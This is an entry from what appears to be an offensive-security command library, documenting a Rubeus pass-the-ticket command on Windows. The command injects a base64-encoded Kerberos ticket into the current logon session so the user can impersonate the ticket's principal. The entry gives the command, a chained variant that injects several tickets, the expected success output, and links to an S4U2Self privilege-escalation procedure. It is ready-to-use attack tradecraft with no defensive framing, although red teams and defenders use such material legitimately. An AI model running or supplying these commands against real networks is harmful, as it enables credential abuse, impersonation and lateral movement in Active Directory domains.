---
id: 09f6bd94-4aec-4de0-849c-b17ee1996445
name: rubeus-ptt-inject-base64-ticket
type: command
executor: powershell
data: 'Rubeus.exe ptt /ticket:"$_BASE64_TGS"'
output: null
created_at: '2023-04-06T03:56:07.821408+00:00'
updated_at: '2023-04-10T20:36:07.954586+00:00'
platforms:
  - Windows
tags:
  - kerberos
  - ptt
verified: true
validated: true
---

# rubeus-ptt-inject-base64-ticket

## Command

```powershell
Rubeus.exe ptt /ticket:"$_BASE64_TGS"
```

## Description

This command injects a base64-encoded Kerberos ticket (TGT or TGS) into the current session's credential cache using Pass-The-Ticket, allowing impersonation of the ticket's principal without re-authentication.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /ticket:"$_BASE64_TGS" | Base64-encoded ticket to inject | Yes |

## Examples

### Basic Usage

```powershell
Rubeus.exe ptt /ticket:"doIF...base64ticket"
```

### Advanced Usage

Inject multiple tickets sequentially:

```powershell
Rubeus.exe ptt /ticket:"$_TGT_BASE64"; Rubeus.exe ptt /ticket:"$_TGS_BASE64"
```

## Expected Output

```
[+] Ticket: doIF...
[+] Ticket successfully imported to LSA session
```
Verify with `klist tgt` to see the injected ticket.

## Related

- [[commands/rubeus-s4u-self-impersonate-admin-base64]]
- [[procedures/Kerberos-S4U2Self-Privilege-Escalation]]
